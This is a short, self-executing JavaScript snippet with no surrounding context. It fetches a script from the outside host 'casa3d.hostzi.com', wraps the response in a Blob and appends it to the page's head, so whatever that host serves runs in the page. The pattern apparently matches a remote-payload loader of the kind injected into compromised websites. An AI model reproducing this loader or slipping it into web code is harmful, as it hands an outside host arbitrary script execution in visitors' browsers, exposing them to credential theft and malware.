!function(){
  var x=new XMLHttpRequest()
  x.open('GET','//casa3d.hostzi.com/init.js')
  x.onload=function(){var s,d=document
    d.head.appendChild(s=d.createElement('script'))
    s.src=URL.createObjectURL(new Blob([this.response],{type:'application/javascript'}))
    'end'}
  x.send()}()